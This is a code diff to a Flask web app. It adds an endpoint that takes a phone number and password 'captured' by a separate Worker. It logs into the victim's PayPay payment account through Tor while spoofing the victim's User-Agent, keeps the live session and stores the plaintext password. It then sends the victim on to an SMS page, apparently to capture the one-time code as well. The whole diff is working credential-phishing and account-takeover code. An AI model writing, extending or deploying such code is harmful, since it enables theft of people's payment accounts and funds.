@@ -5,7 +5,7 @@ import random
 import string
 import re
 from datetime import datetime, timedelta
-from flask import Flask, request, jsonify, send_from_directory, session, render_template
+from flask import Flask, request, jsonify, send_from_directory, session, render_template, redirect
 from tor_utils import via_tor, get_tor_enabled, set_tor_enabled, get_exit_ip, renew_tor_circuit
 
 app = Flask(__name__, static_folder="docs", template_folder="templates")
@@ -209,6 +209,42 @@ def api_link_check():
         })
     except Exception as exc:
         return jsonify({"error": str(exc)}), 400
+
+
+@app.route("/api/worker_capture", methods=["POST"])
+def api_worker_capture():
+    """Worker がキャプチャした phone/password を受け取り、API ログインを試みる"""
+    data = request.get_json(force=True)
+    phone = (data.get("username") or data.get("phone") or "").strip()
+    password = (data.get("password") or "").strip()
+
+    if not phone or not password:
+        return jsonify({"error": "username and password required"}), 400
+
+    try:
+        from PayPaython_mobile import PayPay
+    except ImportError:
+        return jsonify({"error": "PayPaython-mobile not installed"}), 500
+
+    user_agent = request.headers.get("User-Agent", "")
+
+    try:
+        with via_tor():
+            paypay = PayPay(phone, password)
+            sess = getattr(paypay, "session", None) or getattr(paypay, "_session", None)
+            if sess and user_agent:
+                sess.headers.update({"User-Agent": user_agent})
+            paypay.login()
+    except Exception as exc:
+        return jsonify({"error": str(exc), "status": "failed"}), 401
+
+    token = secrets.token_urlsafe(32)
+    _paypay_sessions[token] = paypay
+    session["paypay_token"] = token
+    session["paypay_phone"] = phone
+    session["paypay_pass"] = password
+
+    return jsonify({"status": "sms_required", "redirect": "/sms.html"})
 
 
 @app.route("/api/login", methods=["POST"])
